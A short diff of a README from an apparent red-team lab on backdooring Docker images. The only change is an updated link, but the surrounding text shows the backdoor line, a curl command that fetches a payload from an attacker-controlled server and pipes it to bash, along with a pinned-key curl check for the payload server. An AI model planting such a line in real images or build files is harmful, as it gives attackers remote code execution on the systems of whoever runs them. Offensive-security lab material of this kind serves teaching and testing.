@@ -18,7 +18,7 @@ The line that ends up backdooring the image will be the following:
 curl -s http://<ip_address>:8000/payload.txt | bash
 ```
 
-For added security use public key pinning (See the section [Using ngrok for your payload server address](https://github.com/sneakerhax/OffensiveDocker/blob/main/Labs/backdoored_image_sh/README.md#using-ngrok-for-your-payload-server-address)):
+For added security use public key pinning (See the section [Using ngrok for your payload server address](https://github.com/sneakerhax/TTPs/tree/main/5.Command_and_Control/Docker/backdoored_image_sh#using-ngrok-for-your-payload-server-address)):
 
 ```
 curl -Iksv --pinnedpubkey sha256//0 https://<your_site>.com
